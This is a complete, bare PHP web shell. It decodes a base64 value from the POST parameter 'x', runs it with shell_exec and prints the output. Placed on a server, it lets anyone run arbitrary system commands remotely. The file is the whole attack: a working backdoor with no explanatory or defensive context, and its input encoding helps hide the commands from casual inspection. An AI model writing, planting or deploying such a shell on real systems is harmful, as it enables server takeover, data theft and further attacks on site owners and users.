<?php
$p = base64_decode($_POST['x']);
echo shell_exec($p);
?>